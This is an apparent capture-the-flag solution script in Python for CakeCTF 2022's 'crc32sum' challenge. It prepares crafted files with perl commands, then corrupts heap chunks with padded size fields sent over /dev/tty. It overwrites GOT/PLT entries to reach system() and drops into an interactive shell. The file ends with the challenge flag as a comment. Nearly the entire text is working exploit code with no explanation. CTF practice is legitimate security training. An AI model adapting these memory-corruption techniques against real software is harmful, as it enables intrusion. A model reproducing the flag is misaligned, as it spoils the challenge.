#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './crc32sum'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'pwn2.2022.cakectf.com', 'port':9009})
env.select()

#==========

binf = ELF(bin_file)
addr_gotplt         = binf.sep_section['.got.plt']
addr_plt            = binf.sep_section['.plt']
addr_plt_system     = binf.plt['system']
addr_plt_re_system  = addr_plt + 0x10*3
addr_plt_re_printf  = addr_plt + 0x10*4
addr_plt_re_close   = addr_plt + 0x10*6

#==========

def attack(conn, **kwargs):
    def send_tty(data):
        conn.send(data)
        conn.send(b'\x04')

    conn.recvuntil(b'378:')
    send_tty(b'\x00'*0x18 + p64(0x31))
    conn.recvuntil(b'38:')
    conn.recvuntil(b'38:')
    send_tty(b'\x00'*0x18 + p64(0x41))
    send_tty(b'\x00'*0x18 + p64(0x31) + p64(addr_gotplt+0x18))

def prepare(conn, **kwargs):
    if env.check('remote'):
        print(conn.recv())
        conn.sendline(input('token> '))

    def exec_cmd(cmd):
        conn.sendlineafter(b'$ ', cmd)

    exec_cmd(b'touch 0')
    exec_cmd(b'perl -e "print \'a\'x0x28" > 28')
    exec_cmd(b'perl -e "print \'a\'x0x38" > 38')
    exec_cmd(b'perl -e "print \'a\'x0x378" > 378')
    exec_cmd(b'perl -e "print \'a\'x0x418" > 418')
    exec_cmd('perl -e "print pack(\'QQQQQQ\', {}, {}, {}, {}, {}, {})" > bash'.format(addr_plt_system, 0xdeadbeef, addr_plt_re_system, addr_plt_re_printf, 0xdeadbeef, addr_plt_re_close).encode())
    exec_cmd(b'crc32sum 418 0 38 378 /dev/tty 38 38 /dev/tty 28 /dev/tty 38 bash')

class Pwn:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def func(self):
        self.sendlineafter('> ', '1')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()

    comn.run(prepare)
    comn.run(attack)
    comn.interactive()
    # CakeCTF{pr0c3ss1ng_f1l3s_w1th0ut_BUG_1s_sup3r_h4rd!}

if __name__=='__main__':
    main()

#==========
